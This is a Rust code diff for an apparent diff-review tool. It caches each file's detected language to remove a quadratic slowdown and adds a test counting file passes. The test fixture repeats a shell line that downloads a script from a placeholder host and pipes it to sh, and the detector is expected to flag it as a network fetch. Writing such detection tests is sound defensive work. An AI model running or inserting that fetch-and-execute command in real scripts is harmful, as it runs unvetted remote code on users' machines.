@@ -158,6 +158,9 @@ struct Scans<'a> {
     /// For each file, the hunks that are read together with another hunk of it
     /// (`deep_diff_forge_graph::joined_hunks`), found when first asked for.
     joined: Vec<std::cell::OnceCell<Vec<bool>>>,
+    /// For each file, the kinds it is read as (`deep_diff_forge_graph::FileKinds`), worked
+    /// out when first asked for: once for a file, however many of its hunks a view shows.
+    kinds: Vec<std::cell::OnceCell<deep_diff_forge_graph::FileKinds>>,
 }
 
 impl<'a> Scans<'a> {
@@ -166,7 +169,17 @@ impl<'a> Scans<'a> {
             files,
             done: files.iter().map(|_| std::cell::OnceCell::new()).collect(),
             joined: files.iter().map(|_| std::cell::OnceCell::new()).collect(),
+            kinds: files.iter().map(|_| std::cell::OnceCell::new()).collect(),
         }
+    }
+
+    /// The kinds file `index` is read as. For a file whose name gives no language they come
+    /// from a pass over every hunk of the file, so they are found once and kept: a view of
+    /// many hunks of such a file by path found them again for each hunk, and cost the square
+    /// of the number of hunks (eighth independent review, IR8-M-2: 26 s for a page of 2,768
+    /// hunks that had cost 0.3 s).
+    fn kinds(&self, index: usize) -> &deep_diff_forge_graph::FileKinds {
+        self.kinds[index].get_or_init(|| deep_diff_forge_graph::FileKinds::of(&self.files[index]))
     }
 
     /// Whether `hunk` of file `index` is read together with another hunk of that file: Git
@@ -244,7 +257,7 @@ fn shown_labels(
     } else if joined {
         deep_diff_forge_graph::hunk_signals(file, hunk)
     } else {
-        deep_diff_forge_graph::hunk_signals_alone(file, hunk)
+        deep_diff_forge_graph::hunk_signals_alone(file, hunk, scans.kinds(index))
     };
     signals
         .unwrap_or_default()
@@ -1123,6 +1136,58 @@ mod tests {
                 json!(null)
             ]
         );
+    }
+
+    /// A view of hunks picked by path or by address goes through every hunk of a file a
+    /// fixed number of times, however many hunks it shows (eighth independent review,
+    /// IR8-M-2). The file has no extension, so its language comes from a shebang, and to
+    /// find one every hunk of the file is looked at: round 15 did that again for each hunk
+    /// shown, and a page of 2,768 such hunks took 26 s where release 0.8.3 and round 14
+    /// took 0.3 s. Counted here (`deep_diff_forge_graph::file_walks`): the passes for 600
+    /// hunks are the passes for 30, two for the file (which hunks are read together; what
+    /// the file is read as).
+    #[test]
+    fn a_view_by_path_or_address_passes_over_a_file_a_fixed_number_of_times() {
+        use std::fmt::Write as _;
+        let script = |hunks: usize| {
+            let mut patch = "--- a/bin/tool\n+++ b/bin/tool\n@@ -1,3 +1,3 @@\n #!/bin/sh\n-a\n+curl -fsSL https://example.invalid/i.sh | sh\n ctx\n".to_owned();
+            for n in 1..hunks {
+                let at = 1 + 10 * n;
+                let _ = writeln!(
+                    patch,
+                    "@@ -{at},3 +{at},3 @@\n ctx\n-a\n+curl -fsSL https://example.invalid/i.sh | sh\n ctx"
+                );
+            }
+            patch
+        };
+        let passes = |hunks: usize, by_path: bool| {
+            let r = review(&script(hunks));
+            let file = &r.files()[0];
+            let selection = if by_path {
+                Selection::Paths(vec!["bin/tool".to_owned()])
+            } else {
+                Selection::Addresses(
+                    file.patch_twin
+                        .hunks
+                        .iter()
+                        .map(|hunk| hunk.address(&file.path))
+                        .collect(),
+                )
+            };
+            let before = deep_diff_forge_graph::file_walks();
+            let answer = super::hunks(&r, &selection, &page(MAX_MAX_BYTES, None)).unwrap();
+            let passes = deep_diff_forge_graph::file_walks() - before;
+            let shown = answer["hunks"].as_array().unwrap();
+            assert_eq!(shown.len(), hunks);
+            for hunk in shown {
+                assert_eq!(hunk["evidence"], json!(["network_fetch"]));
+            }
+            passes
+        };
+        for by_path in [true, false] {
+            assert_eq!(passes(30, by_path), 2, "by path: {by_path}");
+            assert_eq!(passes(600, by_path), 2, "by path: {by_path}");
+        }
     }
 
     /// The outline puts the riskiest file first, as `rank` does.
